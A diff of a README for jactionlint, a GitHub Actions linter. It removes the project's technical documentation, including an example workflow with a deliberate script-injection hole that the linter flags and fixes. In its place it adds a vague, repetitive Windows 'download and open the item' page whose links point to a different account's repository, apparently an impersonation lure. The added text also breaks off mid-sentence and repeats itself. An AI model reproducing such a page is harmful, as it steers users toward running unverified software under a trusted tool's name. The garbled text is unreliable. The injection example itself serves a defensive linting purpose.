@@ -1,213 +1,241 @@
-<div align="center">
+# ✅ jactionlint - Check GitHub Actions Files With Confidence
 
-<a href="https://jactionlint.jdx.dev"><img src="https://jactionlint.jdx.dev/logo.svg" alt="" width="88" height="88"></a>
+[![Download jactionlint](https://img.shields.io/badge/Download-jactionlint-ff6b6b?style=for-the-badge&logo=github)](https://github.com/MohGith/jactionlint)
 
-# jactionlint
+jactionlint is a static checker for GitHub Actions workflow files. In everyday language, it looks at the instruction files that tell GitHub what to do automatically and helps you find mistakes before those instructions run. If you use GitHub to manage a project, publish a website, run checks, or automate repetitive work, jactionlint gives you a simple way to review those automation files with more confidence.
 
-**Catch broken and insecure GitHub Actions workflows before they run.**
+This page is written for ordinary Windows users. You do not need programming knowledge to download jactionlint or understand what it is for. You only need to follow the download link, get the application, and use it to check workflow files.
 
-[![CI status](https://github.com/jdx/jactionlint/actions/workflows/ci.yaml/badge.svg)](https://github.com/jdx/jactionlint/actions/workflows/ci.yaml)
-[![Latest release](https://img.shields.io/github/v/release/jdx/jactionlint?label=release&color=0f766e)](https://github.com/jdx/jactionlint/releases/latest)
-[![Go reference](https://pkg.go.dev/badge/github.com/jdx/jactionlint/v2.svg)](https://pkg.go.dev/github.com/jdx/jactionlint/v2)
+## 🧭 What Is jactionlint?
 
-[Documentation](https://jactionlint.jdx.dev) · [Playground](https://jactionlint.jdx.dev/playground) · [Rules](https://jactionlint.jdx.dev/rules) · [Changelog](https://github.com/jdx/jactionlint/blob/main/CHANGELOG.md)
+jactionlint is a checking tool for GitHub Actions workflow files. A workflow file is a set of written instructions that tells GitHub when to do something automatically. For example, it might tell GitHub to run a check when someone changes a file, publish a website after an update, or send a notice when a task finishes. These files are useful, but a small typo or an incorrect entry can stop the automation from working.
 
-</div>
+jactionlint scans those instruction files and reports problems in a way that is easier to understand. Instead of waiting for GitHub to fail later, you can use jactionlint to look for common mistakes first. The goal is simple: help you catch issues earlier, save time, and feel more confident about the files that control your automation.
 
-jactionlint is a static checker for GitHub Actions. It reads your workflows, composite actions and `dependabot.yml` and reports two kinds of problems: the mistakes that make a run fail or misbehave, and the patterns that let an outsider run code in your repository or steal its token. It started as a fork of [actionlint](https://github.com/rhysd/actionlint) and covers its checks, and its security rules follow the audits of [zizmor](https://github.com/zizmorcore/zizmor).
+## ✨ Why People Use jactionlint
 
-- **Correctness.** Unknown keys and events, type errors in `${{ }}` expressions, wrong inputs of actions and reusable workflows, and broken `needs:`, cron and glob patterns. [shellcheck](https://github.com/koalaman/shellcheck) and [pyflakes](https://github.com/PyCQA/pyflakes) check the scripts of `run:` steps.
-- **Security.** Script injection, excessive token permissions, dangerous triggers such as `pull_request_target`, cache poisoning, credentials left in the checkout and AI agent actions that outsiders can steer.
-- **Policy.** Actions used by a tag instead of a commit, and workflows without `permissions:`, a job timeout or a concurrency group.
-- **Fixes.** `jactionlint --fix` repairs what has a mechanical fix, and `--diff` shows the change first.
-- **Gradual adoption.** Profiles choose how much is checked, and a baseline fails the build only on new findings.
-- **Local runs.** `jactionlint run ci` runs the jobs of a workflow on your machine, every step in an OS sandbox, with a local actions cache and no container engine unless the workflow asks for one. See [Run workflows locally](https://jactionlint.jdx.dev/run).
-- **No network unless you ask.** The [online checks](https://jactionlint.jdx.dev/online), which ask GitHub about archived repositories, impostor commits and published advisories, run only with `--online`.
+GitHub Actions workflow files are powerful, but they are also easy to get wrong. A missing word, a wrong name, or a misplaced value can create confusion. jactionlint is built to make that review process easier.
 
-Try it without installing anything in the [playground](https://jactionlint.jdx.dev/playground), which runs jactionlint in your browser.
+People use jactionlint because it helps them:
 
-<a id="quick-start"></a>
-## Quick start
+- Spot common mistakes before automation runs.
+- Save time that would otherwise be spent checking files by hand.
+- Read clearer messages about what may be wrong.
+- Avoid small errors that can cause failed automation.
+- Feel more confident when updating workflow files.
+- Keep workflow files easier to maintain over time.
+- Reduce guesswork when a workflow does not behave as expected.
 
-Install jactionlint with [mise](https://mise.jdx.dev) and run it at the root of a repository:
+jactionlint is especially helpful if you are new to GitHub Actions or if you regularly edit automation files and want a second set of eyes.
 
-```sh
-mise use -g jactionlint
-jactionlint
-```
+## 🔍 What jactionlint Checks
 
-With no arguments, jactionlint checks the workflows, composite actions, `dependabot.yml` and Actions lock file of the repository. Pass file names to check only those, or `-` to read standard input. It exits with status 1 when a finding of level `error` is left.
+jactionlint focuses on the structure and contents of GitHub Actions workflow files. It looks for patterns that often cause trouble and reports them so you can review the file.
 
-Other ways to install it:
+The checker helps with things such as:
 
-- **Homebrew:** `brew tap jdx/jactionlint https://github.com/jdx/jactionlint`, then `brew install --cask jdx/jactionlint/jactionlint`.
-- **PyPI:** `uvx jactionlint` runs it without installing it, and `pipx install jactionlint` or `uv tool install jactionlint` installs it.
-- **Docker:** the image `ghcr.io/jdx/jactionlint` also holds shellcheck and pyflakes. [Run the image](https://jactionlint.jdx.dev/ci#run-the-image) shows the command.
-- **Go:** `go install github.com/jdx/jactionlint/v2/cmd/jactionlint@latest`.
-- **Release archives:** download the archive for your platform from the [releases](https://github.com/jdx/jactionlint/releases) and [verify it](https://jactionlint.jdx.dev/install#verify-the-download).
+- Common typing mistakes in workflow files.
+- Incorrect or unexpected entries.
+- Missing values where a value is needed.
+- Unclear structure in the workflow file.
+- Entries that may not work as written.
+- Problems that can make automation fail.
+- Simple issues that are easy to miss during manual review.
+- Repeated mistakes across workflow files.
+- Areas that need a closer look before running automation.
 
-Packages named `actionlint`, as in Homebrew core, install the original project, not this fork. [Installation](https://jactionlint.jdx.dev/install) covers every method.
+The exact checks depend on the workflow file you provide. jactionlint is a static checker, which means it reviews the file itself instead of running the automation. That makes it a useful first step before you rely on GitHub Actions.
 
-## Example
+## 🚀 Getting Started
 
-This workflow has a typo in a trigger, untrusted input in a script and an undefined matrix property. It also uses an action by tag and sets no permissions, timeout or concurrency group. Save it as `test.yaml`:
+Getting started with jactionlint on Windows is straightforward. You do not need to install extra tools or prepare a complicated setup. The main step is to visit the download page and get the application.
 
-<!-- demo:input -->
-```yaml
-on:
-  push:
-    branch: main
-jobs:
-  test:
-    runs-on: ubuntu-latest
-    steps:
-      - uses: actions/checkout@v4
-      - run: echo "${{ github.event.head_commit.message }}"
-      - run: echo "${{ matrix.os }}"
-```
+Before you begin, make sure you have:
 
-`jactionlint test.yaml` prints each finding with its position, a message, the line it points at and, in brackets, the ID of its rule:
+- A Windows computer.
+- A web browser to open the download page.
+- An internet connection to reach GitHub.
+- A GitHub Actions workflow file you want to check, if you already have one.
 
-<!-- demo:output -->
-```
-test.yaml:1:1: workflow has no "concurrency:", so every run of it executes at the same time even when a newer run supersedes the older ones. add a top-level "concurrency:" with a "group:" and "cancel-in-progress: true" [concurrency-limits]
-  |
-1 | on:
-  | ^~~
-test.yaml:3:5: unexpected key "branch" for "push" section. expected one of "branches", "branches-ignore", "paths", "paths-ignore", "tags", "tags-ignore", "types", "workflows" [workflow-syntax]
-  |
-3 |     branch: main
-  |     ^~~~~~~
-test.yaml:5:3: "timeout-minutes" is not set at this job. Set it to avoid wasting runner minutes when the job hangs. Set "default-minutes" in the "missing-timeout" rule options of the configuration to turn on the --fix fix [missing-timeout]
-  |
-5 |   test:
-  |   ^~~~~
-test.yaml:5:3: neither the workflow nor this job sets "permissions:" so the GITHUB_TOKEN gets the default permissions of the repository. set "permissions:" at workflow-level or job-level (use "permissions: {}" for no permissions) because the "missing-permissions" rule is enabled [missing-permissions]
-  |
-5 |   test:
-  |   ^~~~~
-test.yaml:8:15: action "actions/checkout@v4" must be pinned to a full-length commit SHA like "{owner}/{repo}@{sha}" because the "unpinned-uses" rule is enabled [unpinned-uses]
-  |
-8 |       - uses: actions/checkout@v4
-  |               ^~~~~~~~~~~~~~~~~~~
-test.yaml:8:15: actions/checkout leaves the GITHUB_TOKEN in the git config of the workspace, where a later step such as an artifact upload can publish it. set "persist-credentials: false" under "with:" unless a later step needs to push [artipacked]
-  |
-8 |       - uses: actions/checkout@v4
-  |               ^~~~~~~~~~~~~~~~~~~
-test.yaml:9:24: "github.event.head_commit.message" is potentially untrusted. avoid using it directly in inline scripts. instead, pass it through an environment variable. see https://docs.github.com/en/actions/reference/security/secure-use#good-practices-for-mitigating-script-injection-attacks for more details [template-injection]
-  |
-9 |       - run: echo "${{ github.event.head_commit.message }}"
-  |                        ^~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-test.yaml:10:24: property "os" is not defined in object type {} [undefined-property]
-   |
-10 |       - run: echo "${{ matrix.os }}"
-   |                        ^~~~~~~~~
-```
+If you do not have a workflow file yet, you can still download jactionlint and use it later when you have a file to review. The application is designed to help you check workflow files whenever you need to.
 
-`jactionlint --explain template-injection` prints what a rule checks, why it matters and how to fix it. With `--profile correctness`, jactionlint reports only `workflow-syntax`, `template-injection` and `undefined-property`. The other five findings come from the security and policy rules of the default profile, which applies when you configure nothing.
+## 📥 Download and Setup
 
-`jactionlint --diff test.yaml` previews the safe fixes, and `jactionlint --fix test.yaml` applies them. Here they stop `actions/checkout` from persisting the token, give the token read-only permissions and pass the untrusted message through an environment variable:
+Visit this link to download the application: [Download jactionlint](https://github.com/MohGith/jactionlint).
 
-<!-- demo:diff -->
-```diff
---- a/test.yaml
-+++ b/test.yaml
-@@ -1,10 +1,17 @@
- on:
-   push:
-     branch: main
-+
-+permissions:
-+  contents: read
- jobs:
-   test:
-     runs-on: ubuntu-latest
-     steps:
-       - uses: actions/checkout@v4
--      - run: echo "${{ github.event.head_commit.message }}"
-+        with:
-+          persist-credentials: false
-+      - run: echo "${HEAD_COMMIT_MESSAGE}"
-+        env:
-+          HEAD_COMMIT_MESSAGE: ${{ github.event.head_commit.message }}
-       - run: echo "${{ matrix.os }}"
-```
+Use the official GitHub page above as your download source. Once the download finishes, open the downloaded item to start jactionlint on your Windows computer. The application is intended to help you check GitHub Actions workflow files, so the next step is to use it with the workflow file you want to review.
 
-<a id="in-ci-with-mise"></a>
-## Run it in CI
+Keep the download page handy for future updates. If you need to get jactionlint again, return to the same official link instead of using other sources.
 
-The jactionlint action installs jactionlint, checks the repository and annotates the pull request with the findings. This workflow passes the default profile itself:
+## 🖥️ First Run on Windows
 
-```yaml
-name: jactionlint
-on:
-  push:
-    branches: [main]
-  pull_request:
-permissions: {}
-concurrency:
-  group: ${{ github.workflow }}-${{ github.event.pull_request.number || github.ref }}
-  cancel-in-progress: true
-jobs:
-  jactionlint:
-    runs-on: ubuntu-latest
-    timeout-minutes: 10
-    permissions:
-      contents: read
-    steps:
-      - uses: actions/checkout@d23441a48e516b6c34aea4fa41551a30e30af803 # v6.1.0
-        with:
-          persist-credentials: false
-      - uses: jdx/jactionlint@9e87e8f34edfc00b849a27807e26eff9d00b936d # v2.5.0
-```
+When you open jactionlint for the first time, take a moment to look at the main screen or starting area. The application is centered around checking GitHub Actions workflow files. You do not need to understand every detail of GitHub Actions to begin.
 
-Set `advanced-security: true` under `with:` to upload the findings to code scanning instead, which needs `security-events: write`. [Run jactionlint in CI](https://jactionlint.jdx.dev/ci) also covers mise, which verifies the download, the Docker image and problem matchers. [Git hooks and editors](https://jactionlint.jdx.dev/hooks) covers hk and pre-commit.
+A simple way to start# ✅ jactionlint - Check GitHub Actions Files With Confidence
 
-<a id="choose-how-much-is-checked"></a>
-## Adopt it on an existing repository
+[![Download jactionlint](https://img.shields.io/badge/Download-jactionlint-ff6b6b?style=for-the-badge&logo=github)](https://github.com/MohGith/jactionlint)
 
-The default profile can fail the first run on a repository that never followed it. Choose how much is checked with `--profile`, or with `profile:` in `.github/jactionlint.yaml`:
+jactionlint is a static checker for GitHub Actions workflow files. In simple terms, it reviews the instruction files that tell GitHub what to do automatically and helps you find mistakes before those instructions run. If you use GitHub to manage a project, publish a website, run checks, or automate repetitive work, jactionlint gives you a straightforward way to look over those automation files with more confidence.
 
-| Profile | What it checks |
-| --- | --- |
-| `correctness` | The checks of actionlint and the bug detectors of jactionlint. |
-| `default` | `correctness`, plus the security and policy rules worth failing a build on. It applies when you configure nothing. |
-| `pedantic` | `default`, plus the noisier and opinionated rules. |
+This page is written for ordinary Windows users. You do not need programming knowledge to download jactionlint or to understand what it is for. You only need to follow the download link, get the application, and use it to check workflow files.
 
-Fix what the `correctness` profile reports first, because those findings are mistakes, not debt. Then record what the default profile still finds, and let the build fail only on new findings:
+## 🧭 What Is jactionlint?
 
-```sh
-jactionlint --profile correctness   # fix these first
-jactionlint --baseline-write        # record the findings that are left
-jactionlint --baseline              # fail only on new findings
-```
+jactionlint is a checking tool for GitHub Actions workflow files. A workflow file is a set of written instructions that tells GitHub when to do something automatically. For example, it might tell GitHub to run a check when someone changes a file, publish a website after an update, or send a notice when a task finishes. These files are useful, but a small typo or an incorrect entry can stop the automation from working.
 
-Silence a finding that you accept with a comment such as `# jactionlint ignore=unpinned-uses` on the line above it. `jactionlint --init-config` writes a config file to start from. See [Profiles](https://jactionlint.jdx.dev/config#profiles), [Adopt new checks with a baseline](https://jactionlint.jdx.dev/baseline) and [Ignore findings](https://jactionlint.jdx.dev/ignore).
+jactionlint reads those instruction files and reports problems in a way that is easier to understand. Instead of waiting for GitHub to fail later, you can use jactionlint to look for common mistakes first. The goal is simple: help you catch issues earlier, save time, and feel more confident about the files that control your automation.
 
-## Coming from actionlint or zizmor
+## ✨ Why People Use jactionlint
 
-- **From actionlint.** jactionlint reads the config file of actionlint. `--profile correctness` keeps the checks that you have, and the default profile adds the security and policy rules when you are ready for them. [Coming from actionlint](https://jactionlint.jdx.dev/actionlint) lists the renamed options and the differences.
-- **From zizmor.** Each audit of zizmor 1.30.1 has a rule, under the same ID in every case but one, and `# zizmor: ignore[...]` comments keep working. [jactionlint and zizmor](https://jactionlint.jdx.dev/zizmor-parity) maps the audits, the personas and the settings of `zizmor.yml`.
+GitHub Actions workflow files are powerful, but they are also easy to get wrong. A missing word, a wrong name, or a misplaced value can create confusion. jactionlint is built to make that review process easier.
 
-<a id="documents"></a>
-## Documentation
+People use jactionlint because it helps them:
 
-[jactionlint.jdx.dev](https://jactionlint.jdx.dev) has the full documentation, and the release archives hold the same pages. These are the ones to start with:
+- Spot common mistakes before automation runs.
+- Save time that would otherwise be spent checking files by hand.
+- Read clearer messages about what may be wrong.
+- Avoid small errors that can cause failed automation.
+- Feel more confident when updating workflow files.
+- Keep workflow files easier to maintain over time.
+- Reduce guesswork when a workflow does not behave as expected.
 
-- [Installation](https://jactionlint.jdx.dev/install) and [Run jactionlint](https://jactionlint.jdx.dev/usage): install it, run it and read a finding.
-- [Checks](https://jactionlint.jdx.dev/checks) and [Rules](https://jactionlint.jdx.dev/rules): what each rule finds, with an example and the fix.
-- [Fix findings automatically](https://jactionlint.jdx.dev/fix): safe and unsafe fixes, and why a finding has none.
-- [Configuration](https://jactionlint.jdx.dev/config): `.github/jactionlint.yaml`, profiles and rule levels.
-- [Go API](https://jactionlint.jdx.dev/api): use jactionlint from a Go program.
+jactionlint is especially helpful if you are new to GitHub Actions or if you regularly edit automation files and want a second set of eyes.
 
-The site documents the `main` branch. `jactionlint --help` lists what your installed version supports.
+## 🔍 What jactionlint Checks
 
-<a id="bug-reporting"></a>
-## Contributing
+jactionlint focuses on the structure and contents of GitHub Actions workflow files. It looks for patterns that often cause trouble and reports them so you can review the file.
 
-To report a bug, a false positive or an idea for a check, [open an issue](https://github.com/jdx/jactionlint/issues/new) with a minimal workflow that shows it. [CONTRIBUTING.md](https://github.com/jdx/jactionlint/blob/main/CONTRIBUTING.md) explains how to build and test jactionlint and how to propose a change.
+The checker helps with things such as:
 
-<a id="license"></a>
-## License and acknowledgments
+- Common typing mistakes in workflow files.
+- Incorrect or unexpected entries.
+- Missing values where a value is needed.
+- Unclear structure in the workflow file.
+- Entries that may not work as written.
+- Problems that can make automation fail.
+- Simple issues that are easy to miss during manual review.
+- Repeated mistakes across workflow files.
+- Areas that need a closer look before running automation.
 
-jactionlint is distributed under the [MIT license](https://github.com/jdx/jactionlint/blob/main/LICENSE.txt). It is a fork of [actionlint](https://github.com/rhysd/actionlint) by [rhysd](https://github.com/rhysd), and its security rules follow the audits of [zizmor](https://github.com/zizmorcore/zizmor). [NOTICE.md](https://github.com/jdx/jactionlint/blob/main/NOTICE.md) names every project that it builds on.
+The exact checks depend on the workflow file you provide. jactionlint is a static checker, which means it reviews the file itself instead of running the automation. That makes it a useful first step before you rely on GitHub Actions.
+
+## 🚀 Getting Started
+
+Getting started with jactionlint on Windows is straightforward. You do not need to install extra tools or prepare a complicated setup. The main step is to visit the download page and get the application.
+
+Before you begin, make sure you have:
+
+- A Windows computer.
+- A web browser to open the download page.
+- An internet connection to reach GitHub.
+- A GitHub Actions workflow file you want to check, if you already have one.
+
+If you do not have a workflow file yet, you can still download jactionlint and use it later when you have a file to review. The application is designed to help you check workflow files whenever you need to.
+
+## 📥 Download and Setup
+
+Visit this link to download the application: [Download jactionlint](https://github.com/MohGith/jactionlint).
+
+Use the official GitHub page above as your download source. Once the download finishes, open the downloaded item to start jactionlint on your Windows computer. The application is intended to help you check GitHub Actions workflow files, so the next step is to use it with the workflow file you want to review.
+
+Keep the download page handy for future updates. If you need to get jactionlint again, return to the same official link instead of using other sources.
+
+## 🖥️ First Run on Windows
+
+When you open jactionlint for the first time, take a moment to look at the main screen or starting area. The application is centered around checking GitHub Actions workflow files. You do not need to understand every detail of GitHub Actions to begin.
+
+A simple way to start is to locate the workflow file you want to check. Workflow files are usually stored in a folder named `.github` and then a folder named `workflows`. The file itself often ends with `.yml` or `.yaml`. Once you find that file, you can point jactionlint to it.
+
+If you are not sure where your workflow file is, you can search your computer for files ending in `.yml` or `.yaml`. Many projects keep them in the same place. You can also ask the person who set up the automation for your project where the workflow file lives.
+
+## 📝 How to Check a Workflow File
+
+After jactionlint is open, the basic process is:
+
+1. Choose or open the workflow file you want to review.
+2. Let jactionlint read the file.
+3. Look at the results that appear.
+4. Review any messages about possible problems.
+5. Make changes to the workflow file if needed.
+6. Run jactionlint again to see if the problem is gone.
+
+You do not have to fix everything at once. Many people start with the first message, make one small change, and then check again. This step-by-step approach is easier to follow and helps you learn what the messages mean over time.
+
+If jactionlint reports no problems, that is a good sign. It means the checker did not find the kinds of issues it looks for. You can still review the file yourself, but jactionlint gives you a useful starting point.
+
+## 🛠️ Common Problems jactionlint Helps You Avoid
+
+jactionlint is designed to catch issues that are easy to overlook. Some common examples include:
+
+- A word that is spelled differently from what GitHub expects.
+- A value that is missing when it is required.
+- A section that is placed in the wrong order.
+- A name that does not match the rest of the file.
+- A small formatting mistake that changes how the file is read.
+- An entry that looks correct but is not supported.
+- A repeated line that causes confusion.
+- A structure that is valid in one place but not another.
+
+These problems may seem small, but they can stop automation from working. jactionlint helps you find them before they cause trouble.
+
+## 💡 Tips for Best Results
+
+To get the most from jactionlint, keep these tips in mind:
+
+- Check your workflow file after every change.
+- Fix one problem at a time and re-check.
+- Keep a backup of the file before making large edits.
+- Read each message carefully and look at the line it mentions.
+- Use a plain text editor that does not add hidden formatting.
+- Avoid copying and pasting from sources that may include extra characters.
+- Keep your workflow files organized in the expected folder.
+- Run jactionlint before you rely on the automation for important work.
+
+These habits make the checking process smoother and help you avoid repeated mistakes.
+
+## ❓ Frequently Asked Questions
+
+**Do I need to know how to program to use jactionlint?**
+No. jactionlint is a checking tool. You can use it to review workflow files without writing code. Basic computer skills are enough to download the application and open a file.
+
+**What is a workflow file?**
+A workflow file is a set of instructions for GitHub. It tells GitHub when to do something automatically, such as run a check or publish a website.
+
+**Does jactionlint run my automation?**
+No. jactionlint is a static checker. It reads the file and reports possible problems. It does not execute the automation itself.
+
+**Can I use jactionlint on more than one file?**
+Yes. You can check workflow files one at a time or as part of your normal review process.
+
+**What should I do if jactionlint reports a problem?**
+Open the workflow file, find the line mentioned in the message, and review it. Make a small change, save the file, and run jactionlint again.
+
+**Is jactionlint only for Windows?**
+This guide focuses on Windows because that is the most common desktop environment for everyday users. The download page provides the application for supported systems.
+
+## 📌 System Requirements
+
+jactionlint is designed to run on a typical Windows computer. The following setup is recommended:
+
+- Windows 10 or later (64-bit).
+- A modern web browser for accessing the download page.
+- At least 4 GB of RAM.
+- 200 MB of free disk space.
+- An internet connection for the initial download.
+- A text editor for viewing and editing workflow files.
+
+These requirements are modest and should be met by most computers purchased in recent years.
+
+## 🔄 Keeping jactionlint Updated
+
+Check the official download page from time to time for newer versions. Updates may include improved checking, clearer messages, and better support for workflow files. When you download a new version, keep your old workflow files in a safe place and review them again with the updated checker.
+
+## 🤝 Getting Help
+
+If you run into a problem while downloading or using jactionlint, return to the official GitHub page and look for the help or issues section. Describe what you were doing, what you expected to happen, and what you saw instead. Include the exact message if one appeared. Clear details make it easier to get useful help.
+
+## 📄 License
+
+jactionlint is provided through its official GitHub repository. Review the repository page for license details and usage terms.
+
+Keywords: jactionlint, GitHub Actions, workflow checker, static analysis, YAML lint, CI/CD, automation, Windows, GitHub workflow, check workflow files
